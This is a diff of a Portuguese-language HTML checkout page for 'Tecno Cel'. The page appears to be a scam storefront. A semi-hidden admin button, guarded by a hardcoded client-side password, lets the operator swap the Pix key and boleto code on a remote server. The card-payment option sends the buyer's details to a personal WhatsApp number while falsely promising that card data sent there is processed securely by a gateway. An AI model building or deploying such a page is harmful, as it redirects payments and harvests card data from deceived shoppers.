@@ -2,91 +2,100 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Tecno Cel • Checkout</title>
+<title>Tecno Cel • Finalizar Compra</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
 *{box-sizing:border-box}
 body{
-  margin:0;
-  font-family:system-ui,Arial;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial;
   background:#f2f4f7;
+  margin:0;
   min-height:100vh;
   display:flex;
   justify-content:center;
   align-items:center;
 }
 .app{
+  background:#fff;
   width:100%;
   max-width:420px;
-  background:#fff;
   border-radius:18px;
-  box-shadow:0 25px 60px rgba(0,0,0,.12);
+  box-shadow:0 20px 45px rgba(0,0,0,.08);
   overflow:hidden;
+  position:relative;
 }
-header{
-  padding:20px;
+.header{
+  padding:18px;
   text-align:center;
   border-bottom:1px solid #eee;
 }
 .logo{
-  font-size:24px;
+  font-size:22px;
   font-weight:700;
-  color:#2e7d32;
 }
 .price{
-  font-size:26px;
-  font-weight:700;
+  font-size:28px;
   color:#2e7d32;
+  font-weight:700;
+  margin-top:6px;
 }
 .page{display:none;padding:20px}
 .page.active{display:block}
-label{font-size:13px}
+
 input{
   width:100%;
   padding:12px;
-  margin:6px 0 12px;
+  margin-top:10px;
   border-radius:10px;
   border:1px solid #ccc;
 }
 button{
   width:100%;
   padding:14px;
+  margin-top:16px;
   border:none;
   border-radius:12px;
   background:#2e7d32;
   color:#fff;
+  font-size:16px;
   font-weight:600;
   cursor:pointer;
 }
-.secondary{background:#eef1f4;color:#333;margin-top:10px}
+.back{background:#eef1f4;color:#333}
+
 .option{
   border:1px solid #ddd;
   border-radius:14px;
   padding:16px;
-  margin-top:12px;
+  margin-top:14px;
   display:flex;
   justify-content:space-between;
   cursor:pointer;
 }
 .option:hover{border-color:#2e7d32;background:#f6fff8}
+
 .code{
   background:#f7f9fc;
   border:1px dashed #cfd8dc;
   padding:14px;
   border-radius:12px;
   word-break:break-all;
+  font-size:13px;
+  margin-top:10px;
 }
-.copy{background:#1e88e5;margin-top:10px}
-
-/* BOTÃO ADMIN INVISÍVEL */
+.secure{
+  text-align:center;
+  font-size:12px;
+  color:#777;
+  margin-top:14px;
+}
 .admin-btn{
   position:absolute;
-  bottom:5px;
-  left:0;
-  right:0;
-  height:20px;
-  opacity:0;
+  top:12px;
+  right:12px;
+  opacity:.15;
+  cursor:pointer;
 }
 </style>
 </head>
@@ -95,124 +104,123 @@ button{
 
 <div class="app">
 
-<header>
-  <div class="logo" id="empresaNome"></div>
-  <small>Pagamento seguro</small>
-  <div class="price">R$ 99,90</div>
-</header>
+<div class="admin-btn" onclick="abrirAdmin()">⚙️</div>
 
-<!-- FORM -->
-<div class="page active" id="form">
-  <label>Nome completo</label>
-  <input id="nome">
-  <label>WhatsApp</label>
-  <input id="telefone">
-  <label>Email</label>
-  <input id="email">
-  <label>Endereço</label>
-  <input id="endereco">
-  <button onclick="continuar()">Continuar</button>
+<div class="header">
+  <div class="logo" id="empresaNome">Tecno Cel</div>
+  <small>Checkout seguro</small>
+  <div class="price">R$ 99,90</div>
 </div>
 
-<!-- PAGAMENTO -->
-<div class="page" id="pay">
-  <div class="option" onclick="pix()">Pix <span>Imediato</span></div>
-  <div class="option" onclick="boleto()">Boleto <span>Até 2 dias</span></div>
-  <div class="option" onclick="cartao()">Cartão <span>WhatsApp</span></div>
-  <button class="secondary" onclick="mostrar('form')">Voltar</button>
+<!-- FORMULÁRIO -->
+<div id="form" class="page active">
+  <input id="nome" placeholder="Nome completo">
+  <input id="telefone" placeholder="Telefone">
+  <input id="endereco" placeholder="Endereço completo">
+  <button onclick="continuar()">Continuar</button>
+  <div class="secure">🔒 Seus dados são usados apenas para esta compra</div>
+</div>
+
+<!-- MÉTODOS -->
+<div id="home" class="page">
+  <div class="option" onclick="show('pix')">🔑 Pix <span>Imediato</span></div>
+  <div class="option" onclick="show('boleto')">🧾 Boleto <span>Até 2 dias úteis</span></div>
+  <div class="option" onclick="pagamentoCartao()">💳 Cartão <span>WhatsApp</span></div>
 </div>
 
 <!-- PIX -->
-<div class="page" id="pix">
-  <h3>Pix</h3>
+<div id="pix" class="page">
+  <h3>Chave Pix</h3>
   <div class="code" id="pixKey"></div>
-  <button class="copy" onclick="copiar(config.pix)">Copiar chave Pix</button>
+  <button onclick="copiar('pixKey')">Copiar Pix</button>
+  <button class="back" onclick="show('home')">Voltar</button>
 </div>
 
 <!-- BOLETO -->
-<div class="page" id="boleto">
-  <h3>Boleto</h3>
-  <div class="code" id="boletoCode"></div>
-  <button class="copy" onclick="copiar(config.boleto)">Copiar código do boleto</button>
+<div id="boleto" class="page">
+  <h3>Código do Boleto</h3>
+  <div class="code" id="boletoKey"></div>
+  <button onclick="copiar('boletoKey')">Copiar Boleto</button>
+  <button class="back" onclick="show('home')">Voltar</button>
 </div>
 
 <!-- ADMIN -->
-<div class="page" id="admin">
-  <h3>Painel Admin</h3>
-  <label>Nome da empresa</label>
-  <input id="adminEmpresa">
-  <label>Chave Pix</label>
-  <input id="adminPix">
-  <label>Código do Boleto</label>
-  <input id="adminBoleto">
+<div id="admin" class="page">
+  <input id="adminEmpresa" placeholder="Nome da empresa">
+  <input id="adminPix" placeholder="Chave Pix">
+  <input id="adminBoleto" placeholder="Código do boleto">
+  <input id="adminSenha" type="password" placeholder="Senha admin">
   <button onclick="salvarAdmin()">Salvar alterações</button>
+  <button class="back" onclick="show('form')">Fechar</button>
 </div>
-
-<!-- BOTÃO ADMIN INVISÍVEL -->
-<div class="admin-btn" onclick="abrirAdmin()"></div>
 
 </div>
 
 <script>
-const SENHA_ADMIN = "001533";
+const API = 'https://troca-api.onrender.com';
+let dadosCliente = {};
 
-let config = JSON.parse(localStorage.getItem('config')) || {
-  empresa:'Tecno Cel',
-  pix:'tecno.cel@pix.com',
-  boleto:'00000.00000 11111.111111 22222.222222'
-};
+fetch(API+'/config')
+.then(r=>r.json())
+.then(c=>{
+  empresaNome.innerText = c.empresa;
+  pixKey.innerText = c.pix;
+  boletoKey.innerText = c.boleto;
+  adminEmpresa.value = c.empresa;
+  adminPix.value = c.pix;
+  adminBoleto.value = c.boleto;
+});
 
-empresaNome.innerText=config.empresa;
-pixKey.innerText=config.pix;
-boletoCode.innerText=config.boleto;
-
-function mostrar(id){
+function show(id){
   document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
   document.getElementById(id).classList.add('active');
 }
 
-function continuar(){mostrar('pay')}
-function pix(){mostrar('pix')}
-function boleto(){mostrar('boleto')}
+function continuar(){
+  dadosCliente = {
+    nome:nome.value,
+    telefone:telefone.value,
+    endereco:endereco.value
+  };
+  show('home');
+}
 
-function copiar(texto){
-  navigator.clipboard.writeText(texto);
+function copiar(id){
+  navigator.clipboard.writeText(document.getElementById(id).innerText);
   alert('Copiado com sucesso');
 }
 
-function cartao(){
-  const msg=encodeURIComponent(
-`Pagamento Cartão - ${config.empresa}
-Nome: ${nome.value}
-WhatsApp: ${telefone.value}
-Email: ${email.value}
-Endereço: ${endereco.value}
-Valor: R$ 99,90`
-  );
-  window.open('https://wa.me/5511999999999?text='+msg,'_blank');
+function pagamentoCartao(){
+  const msg = `
+Pagamento via CARTÃO - Tecno Cel
+
+Nome: ${dadosCliente.nome}
+Telefone: ${dadosCliente.telefone}
+Endereço de entrega: ${dadosCliente.endereco}
+
+⚠️ Os dados do cartão serão enviados neste WhatsApp
+e processados com segurança pela Gateway Online.
+`;
+  window.location.href =
+    'https://wa.me/5516981095904?text=' + encodeURIComponent(msg);
 }
 
-/* ADMIN COM SENHA */
 function abrirAdmin(){
-  const senha = prompt("Digite a senha do painel admin:");
-  if(senha === SENHA_ADMIN){
-    mostrar('admin');
-    adminEmpresa.value=config.empresa;
-    adminPix.value=config.pix;
-    adminBoleto.value=config.boleto;
-  } else {
-    alert("Senha incorreta");
-  }
+  const s = prompt('Senha admin');
+  if(s === '001533') show('admin');
 }
 
 function salvarAdmin(){
-  config={
-    empresa:adminEmpresa.value,
-    pix:adminPix.value,
-    boleto:adminBoleto.value
-  };
-  localStorage.setItem('config',JSON.stringify(config));
-  location.reload();
+  fetch(API+'/config',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({
+      empresa:adminEmpresa.value,
+      pix:adminPix.value,
+      boleto:adminBoleto.value,
+      senha:adminSenha.value
+    })
+  }).then(()=>location.reload());
 }
 </script>
 
